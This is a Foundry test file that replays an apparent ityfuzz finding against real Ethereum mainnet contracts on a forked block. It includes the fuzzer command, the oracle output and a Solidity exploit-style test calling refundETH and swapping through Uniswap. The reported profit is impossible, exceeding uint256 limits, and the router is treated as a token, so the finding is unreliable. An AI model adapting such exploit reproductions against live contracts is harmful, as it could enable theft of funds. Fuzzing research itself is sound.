// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -o -t 0x46161158b1947D9149E066d6d31AF1283b2d377C,0x27E843260c71443b4CC8cB6bF226C3f77b9695AF,0xebF2096E01455108bAdCbAF86cE30b6e5A72aa52,0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,0xE592427A0AEce92De3Edee1F18E0157C05861564 -c eth --onchain-block-number 15930472 -f -i -p --onchain-etherscan-api-key $ETH_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Oracle ================
Earned 115792089237316195423570985008687907853269984665640564039457584007913129639935000000 more than owed 5192930683834941743231244680822784000000, net earned = 115792089237316195423570985008687907853269979472709880204515840776668448817151000000wei (115792089237316195423570985008687907853269979472709880204515ETH)

================ Trace ================
[38;2;205;121;221m[Sender] 0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd[0m
   ├─[1] [38;2;134;21;100m0xE592427A0AEce92De3Edee1F18E0157C05861564[0m.[38;2;255;123;114mrefundETH[0m{value: [38;2;153;0;204m5192930683834941.7432 Ether[0m}()
   │  ├─[2] [38;2;205;121;221m[Sender] 0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd[0m.fallback()
   ├─[1] [38;2;0;118;255mRouter[0m.[38;2;255;123;114mswapExactTokensForETH[0m(100% Balance, 0, path:([38;2;134;21;100m0xE592427A0AEce92De3Edee1F18E0157C05861564[0m → WETH), address(this), block.timestamp);
   │  │  └─ ← ()


 */

contract C4616 is Test {
    function setUp() public {
        vm.createSelectFork("eth", 15930472);
    }

    function test() public {
        address router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        
        vm.prank(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
        vm.deal(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd, 5192930683834941743231244680822784);
        0xE592427A0AEce92De3Edee1F18E0157C05861564.call{value: 5192930683834941743231244680822784}(abi.encodeWithSignature(
            "refundETH()"
        )); 
        vm.startPrank(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
        uint256 amount0 = IERC20(0xE592427A0AEce92De3Edee1F18E0157C05861564).balanceOf(address(this));
        IERC20(0xE592427A0AEce92De3Edee1F18E0157C05861564).approve(router, amount0);
        address[] memory liq_path0 = new address[](2);
        liq_path0[0] = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
        liq_path0[1] = address(weth);
        vm.deal(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd, amount0);
        IUniswapV2Router(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount0, 0, liq_path0, address(this), block.timestamp
        );
        vm.stopPrank();
    }

    // Stepping with return
    receive() external payable {}
}

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function skim(address to) external;
    function sync() external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
